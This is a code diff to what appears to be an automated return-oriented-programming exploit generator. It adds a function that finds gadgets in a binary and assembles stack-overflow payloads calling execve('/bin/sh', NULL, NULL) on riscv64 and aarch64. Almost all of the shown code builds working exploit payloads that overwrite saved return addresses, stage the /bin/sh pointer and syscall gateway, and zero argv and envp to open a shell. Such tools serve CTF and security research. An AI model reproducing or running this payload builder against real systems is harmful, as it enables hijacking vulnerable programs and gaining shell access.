@@ -111,37 +111,12 @@ def solve_lr_chain(data: bytes, arch: str, *, set_a0: int, call_va: int, offset:
         from .rop import _loads
         segments = [(o, s, v) for o, s, v, fl in _loads(data) if fl & 1] or None
 
-    # CALLERS: a0 <- a callee-saved reg, terminator `jr <callee-saved reg>` (mv a0,sS; jr sB).
-    gc = gadget_emu.find_reg_control_gadgets(data, arch, want=("a0",), segments=segments,
-                                             max_insns=6, max_results=max_candidates * 20,
-                                             scan_cap=120_000_000)
-    callers = []
-    for g in gc:
-        a0 = g["effects"].get("a0", "")
-        if not a0.startswith("reg:"):
-            continue
-        sS = a0.split(":", 1)[1]
-        if not (g["term"].startswith("jr:") and sS in callee):
-            continue
-        sB = g["term"].split(":", 1)[1]
-        if sB in callee and sB != sS and g.get("spadj", 0) == 0:   # caller does not itself touch sp
-            callers.append((g["va"], sS, sB))
-
-    # LOADERS: ret-terminated, ra restored from the stack, and the caller's {sS,sB} loaded from the
-    # stack (so we inject &/bin/sh and the call target). gadget_emu gives each stack offset + spadj.
-    gl = gadget_emu.find_reg_control_gadgets(data, arch, want=tuple(callee) + ("ra",),
-                                             segments=segments, max_insns=max_insns,
-                                             max_results=max_candidates * 40, scan_cap=200_000_000)
-    loaders = []
-    for g in gl:
-        ra = g["effects"].get("ra", "")
-        if g["term"] != "ret" or not ra.startswith("stack@"):
-            continue
-        regoff = {r: int(v.split("@")[1]) for r, v in g["effects"].items()
-                  if r in callee and v.startswith("stack@")}
-        if regoff:
-            loaders.append({"va": g["va"], "raoff": int(ra.split("@")[1]),
-                            "spadj": g["spadj"], "regoff": regoff})
+    # CALLERS (mv a0,sS; jr sB) and ret-terminated callee-saved LOADERS (ra + the caller's {sS,sB}
+    # restored from the stack) -- discovered by gadget_emu via the shared helpers the execve variant
+    # also uses. A loader needs both sS and sB, so requiring >=2 callee-saved slots up front only drops
+    # loaders no caller could pair with.
+    callers = _lr_callers(data, arch, callee, segments, max_candidates)
+    loaders = _lr_value_loaders(data, arch, callee, segments, max_insns, max_candidates)
 
     def p(v):
         return (v & ((1 << (word * 8)) - 1)).to_bytes(word, "little")
@@ -163,4 +138,153 @@ def solve_lr_chain(data: bytes, arch: str, *, set_a0: int, call_va: int, offset:
                             "stack_pos": sp, "sS": sS, "sB": sB, "a0_off": a0_off})
                 if len(out) >= max_candidates:
                     return out
+    return out
+
+
+def _lr_callers(data, arch, callee, segments, max_candidates, preserve=()):
+    """The `mv a0,sS; (jr|br) sB` callers (sS,sB callee-saved; spadj 0 so sp survives) that both
+    solve_lr_chain-style chains branch through -- shared so the execve variant discovers them the same
+    way. With `preserve` (e.g. ("a1","a2")) only callers CERTIFIED to leave those registers untouched
+    are returned -- the execve chain needs the caller not to clobber the argv/envp it set. Returns
+    [(va, sS, sB)]."""
+    need = set(preserve)
+    gc = gadget_emu.find_reg_control_gadgets(data, arch, want=("a0",), segments=segments,
+                                             max_insns=6, max_results=max_candidates * 20,
+                                             scan_cap=120_000_000, preserve=preserve)
+    out = []
+    for g in gc:
+        a0 = g["effects"].get("a0", "")
+        if not (a0.startswith("reg:") and g["term"].startswith("jr:") and g.get("spadj", 0) == 0):
+            continue
+        if need and not need <= set(g.get("preserved", ())):
+            continue
+        sS, sB = a0.split(":", 1)[1], g["term"].split(":", 1)[1]
+        if sS in callee and sB in callee and sS != sB:
+            out.append((g["va"], sS, sB))
+    return out
+
+
+def _lr_value_loaders(data, arch, callee, segments, max_insns, max_candidates, need=2):
+    """The ret-terminated callee-saved LOADERS (ra<-stack, >=`need` callee-saved <-stack) that stage
+    sS=&binsh / sB=target and thread ra -- shared with the execve variant. Returns [{va,regoff,raoff,
+    spadj}]."""
+    gl = gadget_emu.find_reg_control_gadgets(data, arch, want=tuple(callee) + ("ra",),
+                                             segments=segments, max_insns=max_insns,
+                                             max_results=max_candidates * 40, scan_cap=200_000_000)
+    out = []
+    for g in gl:
+        ra = g["effects"].get("ra", "")
+        if g["term"] != "ret" or not ra.startswith("stack@"):
+            continue
+        regoff = {r: int(v.split("@")[1]) for r, v in g["effects"].items()
+                  if r in callee and v.startswith("stack@")}
+        if len(regoff) >= need:
+            out.append({"va": g["va"], "raoff": int(ra.split("@")[1]), "spadj": g["spadj"],
+                        "regoff": regoff})
+    return out
+
+
+def solve_lr_execve_chain(data: bytes, arch: str, *, binsh: int, gateway: int, offset: int,
+                          segments=None, max_insns: int = 20, max_candidates: int = 120,
+                          stack_range=(8, 200, 8), word: int = 8):
+    """execve("/bin/sh", NULL, NULL) via a MULTI-REGISTER ra-threaded chain on the link-register arches
+    (riscv64 / aarch64) -- the multi-register extension of solve_lr_chain. Where `system` needs only
+    a0, execve needs a0=&binsh, a1=0 (argv), a2=0 (envp) AND the syscall `gateway` (libc's `mov x8,#221;
+    svc` / `li a7,221; ecall`). Composition, all ra-threaded (`ret`=`jr ra`/`ret x30`):
+
+      L0 (arg-zeroing loader): a ret-terminated epilogue that sets a1 and a2 -- to 0, or from stack
+         slots we fill with 0 -- and restores ra from the stack (-> LB). a1/a2 are caller-saved, so
+         they are set FIRST and nothing after L0 writes them: LB only touches callee-saved regs + ra,
+         the caller only a0, so a1=a2=0 survive to the syscall.
+      LB (value loader): the same callee-saved loader solve_lr_chain uses -- sets sS=&binsh, sB=gateway
+         and ra -> the caller.
+      caller: `mv a0,sS; (jr|br) sB` with sB=gateway -> a0=&binsh and branch to the gateway.
+
+    L0's entry sp is swept over the overflow; LB's entry sp is L0's + L0's spadj (the post-index). All
+    gadgets are DISCOVERED by gadget_emu (emulated effects), so a1/a2 being cleanly zeroable in a
+    ra-restoring gadget is a MEASURED fact, not an assumption. Returns candidate payloads
+    {payload, l0, lb, caller, base, sS, sB, a0_off}, or [] when NO arg-zeroing loader exists -- the
+    honest decline the riscv a2/envp scarcity produces (there a2 is reachable only as a2<-a0, never
+    cleanly zeroed in a ret-terminated gadget), proven by emulation rather than asserted."""
+    arch = (arch or "").lower()
+    callee = _CALLEE.get(arch)
+    if callee is None or not gadget_emu.available() or not (binsh and gateway):
+        return []
+    if segments is None:
+        from .rop import _loads
+        segments = [(o, s, v) for o, s, v, fl in _loads(data) if fl & 1] or None
+
+    # Callers must leave a1/a2 untouched (they are set before the caller runs); the engine certifies it.
+    callers = _lr_callers(data, arch, callee, segments, max_candidates, preserve=("a1", "a2"))
+    value_loaders = _lr_value_loaders(data, arch, callee, segments, max_insns, max_candidates)
+
+    # ARG-ZEROING LOADERS (L0): ret-terminated, a1 AND a2 both cleanly controllable (hardwired zero,
+    # verified across seedings so an arithmetic 0 doesn't masquerade, or loaded from a stack slot we
+    # set to 0), ra <- stack, AND it must PRESERVE the callee-saved regs (so sS/sB staged by LB survive
+    # it). This is the step the riscv a2/envp wall removes: no ret-terminated gadget there leaves a2 as
+    # a clean zero/stack across seedings, so arg_loaders comes back empty -> honest [].
+    ga = gadget_emu.find_reg_control_gadgets(data, arch, want=("a1", "a2", "ra"), segments=segments,
+                                             max_insns=max_insns, max_results=max_candidates * 40,
+                                             scan_cap=200_000_000, preserve=tuple(callee))
+    arg_loaders = []
+    for g in ga:
+        e = g["effects"]
+        ra, a1, a2 = e.get("ra", ""), e.get("a1", ""), e.get("a2", "")
+        if g["term"] != "ret" or not ra.startswith("stack@"):
+            continue
+        if not (a1 == "zero" or a1.startswith("stack@")):
+            continue
+        if not (a2 == "zero" or a2.startswith("stack@")):
+            continue
+        arg_loaders.append({"va": g["va"], "spadj": g["spadj"], "raoff": int(ra.split("@")[1]),
+                            "a1": None if a1 == "zero" else int(a1.split("@")[1]),
+                            "a2": None if a2 == "zero" else int(a2.split("@")[1]),
+                            "keep": set(g.get("preserved", ()))})
+    if not (arg_loaders and value_loaders and callers):
+        return []                        # honest 'cannot compose' (riscv a2 wall -> no arg_loaders)
+
+    def p(v):
+        return (v & ((1 << (word * 8)) - 1)).to_bytes(word, "little")
+
+    def _span(l, extra):
+        return max([l["raoff"], l["spadj"]] + extra)
+    arg_loaders.sort(key=lambda l: _span(l, [o for o in (l["a1"], l["a2"]) if o is not None]))
+    value_loaders.sort(key=lambda l: _span(l, list(l["regoff"].values())))
+
+    # ORDER: LB first (stage the callee-saved sS/sB + ra), L0 LAST (zero a1/a2). a1/a2 are
+    # caller-saved, so the arg-zeroing must be the last write before the gateway: nothing after L0
+    # touches them (the caller only sets a0). Running L0 first instead lets LB's epilogue clobber a1/a2
+    # on its way through -- the bug that left x2 non-zero. L0 may only clobber a1/a2/ra/x29/x30, so
+    # the callee-saved sS/sB LB staged survive it; the breakpoint confirm (x0=binsh AND x1=x2=0)
+    # rejects any L0 that does disturb them.
+    out = []
+    for LB in value_loaders[:8]:
+        for cva, sS, sB in callers:
+            if sS not in LB["regoff"] or sB not in LB["regoff"]:
+                continue
+            for L0 in arg_loaders[:6]:                    # compact arg-zeroing loaders first
+                if sS not in L0["keep"] or sB not in L0["keep"]:
+                    continue                              # L0 must not clobber the sS/sB LB staged
+                for base in range(*stack_range):          # where LB's entry sp lands in the overflow
+                    l0_base = base + LB["spadj"]           # L0's entry sp = LB's + its post-index
+                    a0_off = base + LB["regoff"][sS]
+                    far = max([base + LB["regoff"][sS], base + LB["regoff"][sB], base + LB["raoff"],
+                               l0_base + L0["raoff"]]
+                              + [l0_base + o for o in (L0["a1"], L0["a2"]) if o is not None])
+                    buf = bytearray(b"A" * (max(offset, far) + 2 * word))
+                    buf[offset:offset + word] = p(LB["va"])               # saved ra -> LB
+                    buf[a0_off:a0_off + word] = p(binsh)                  # sS = &"/bin/sh"
+                    bo = base + LB["regoff"][sB]
+                    buf[bo:bo + word] = p(gateway)                        # sB = gateway
+                    buf[base + LB["raoff"]:base + LB["raoff"] + word] = p(L0["va"])   # LB ra -> L0
+                    if L0["a1"] is not None:
+                        buf[l0_base + L0["a1"]:l0_base + L0["a1"] + word] = p(0)      # a1 = 0 (argv)
+                    if L0["a2"] is not None:
+                        buf[l0_base + L0["a2"]:l0_base + L0["a2"] + word] = p(0)      # a2 = 0 (envp)
+                    ro = l0_base + L0["raoff"]
+                    buf[ro:ro + word] = p(cva)                            # L0 ra -> caller (mv a0,sS; jr sB)
+                    out.append({"payload": bytes(buf), "l0": L0["va"], "lb": LB["va"], "caller": cva,
+                                "base": base, "sS": sS, "sB": sB, "a0_off": a0_off})
+                    if len(out) >= max_candidates:
+                        return out
     return out
